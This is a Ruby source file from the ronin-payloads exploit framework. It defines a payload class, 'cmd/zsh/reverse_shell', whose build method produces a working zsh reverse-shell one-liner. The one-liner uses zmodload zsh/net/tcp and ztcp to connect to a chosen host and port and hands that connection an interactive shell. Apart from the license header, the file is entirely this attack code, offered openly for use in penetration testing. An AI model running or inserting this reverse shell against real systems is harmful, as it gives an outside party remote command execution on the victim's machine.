# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2024 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require_relative '../../../command_payload'
require_relative '../../../mixins/reverse_shell'

module Ronin
  module Payloads
    module CMD
      module Zsh
        #
        # A basic zsh reverse shell command.
        #
        # @since 0.2.0
        #
        class ReverseShell < CommandPayload

          include Mixins::ReverseShell

          register 'cmd/zsh/reverse_shell'

          description <<~DESC
            A basic zsh reverse shell command.
          DESC

          #
          # Builds the zsh reverse shell command.
          #
          def build
            @payload = "zsh -c 'zmodload zsh/net/tcp && ztcp #{host} #{port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
          end

        end
      end
    end
  end
end
